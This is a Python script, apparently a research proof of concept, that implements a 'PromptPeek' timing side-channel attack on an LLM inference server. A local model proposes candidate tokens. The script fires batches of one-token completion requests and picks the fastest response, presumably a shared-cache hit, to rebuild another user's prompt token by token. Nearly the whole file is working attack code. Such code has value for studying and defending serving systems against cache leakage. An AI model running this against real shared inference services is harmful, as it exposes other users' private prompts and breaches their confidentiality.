import aiohttp
import asyncio
import time
import numpy as np
from transformers import AutoTokenizer, AutoModelForCausalLM
import torch


# -----------------------------
# Config
# -----------------------------
REMOTE_URL = "http://localhost:30000/v1/completions"
SESSION_ID = "session_1"

LOCAL_ATTACKER_MODEL = "/data/sukyeong/models/Qwen"

TOP_K = 50
N_PRE = 300
N_CAND = 50
N_POST = 300


# -----------------------------
# 1. candidate generation
# -----------------------------
tokenizer = AutoTokenizer.from_pretrained(LOCAL_ATTACKER_MODEL)
local_model = AutoModelForCausalLM.from_pretrained(
    LOCAL_ATTACKER_MODEL,
    torch_dtype=torch.bfloat16,
    device_map="auto"
)

def generate_candidates(fragment, k=TOP_K):
    inputs = tokenizer(fragment, return_tensors="pt").to(local_model.device)

    with torch.no_grad():
        logits = local_model(**inputs).logits[:, -1, :]
        probs = torch.softmax(logits, dim=-1)

    topk = torch.topk(probs, k)
    candidates = [tokenizer.decode([tid]) for tid in topk.indices[0]]

    # dummy token = lowest prob
    dummy_idx = torch.argmin(probs)
    dummy_token = tokenizer.decode([dummy_idx])

    candidates = [c.strip() for c in candidates]
    dummy_token = dummy_token.strip()

    return candidates, dummy_token


# -----------------------------
# 2. Send requests
# -----------------------------
async def send_request(session, prompt):
    payload = {
        "model": "/data/sukyeong/models/Qwen/",
        "prompt": prompt,
        "session_id": SESSION_ID,
        "max_tokens": 1
    }

    t0 = time.time()
    async with session.post(REMOTE_URL, json=payload) as resp:
        await resp.text()
        return time.time() - t0


async def send_batch(prefix, candidates, dummy, fragment):
    async with aiohttp.ClientSession() as session:

        tasks = []

        # 1) Pre-dummy batch
        for _ in range(N_PRE):
            tasks.append(send_request(session, fragment + dummy))

        # 2) Candidate batch
        for tok in candidates:
            tasks.append(send_request(session, fragment + " " + tok))

        # 3) Post-dummy batch
        for _ in range(N_POST):
            tasks.append(send_request(session, fragment + dummy))

        results = await asyncio.gather(*tasks)
        return results


# -----------------------------
# 3. Token extraction
# -----------------------------
async def extract_token(fragment):

    candidates, dummy = generate_candidates(fragment, TOP_K)
    print(f"[+] candidates = {len(candidates)} dummy='{dummy}'")

    results = await send_batch(
        prefix=fragment,
        candidates=candidates,
        dummy=dummy,
        fragment=fragment
    )

    pre  = results[:N_PRE]
    cand = results[N_PRE:N_PRE + len(candidates)]
    post = results[N_PRE + len(candidates):]

    cand_lat = np.array(cand)
    best_idx = cand_lat.argmin()
    best_tok = candidates[best_idx]

    print(f"[RECOVERED TOKEN] = '{best_tok}' (lat={cand_lat[best_idx]:.4f})")
    return best_tok


# -----------------------------
# 4. PromptPeek attack
# -----------------------------
async def promptpeek_attack(start_fragment=""):
    fragment = start_fragment

    print("=== PromptPeek Attack Start ===\n")

    while True:
        tok = await extract_token(fragment)

        if tok.strip() == "":
            print("[TERMINATE] empty token.")
            break

        fragment = (fragment + " " + tok).strip()
        print(f"[FRAGMENT] {fragment}")

        if len(fragment.split()) > 100:
            break

    print("\n=== FINAL RECONSTRUCTED PROMPT ===")
    print(fragment)
    return fragment


if __name__ == "__main__":
    asyncio.run(promptpeek_attack("Imagine"))
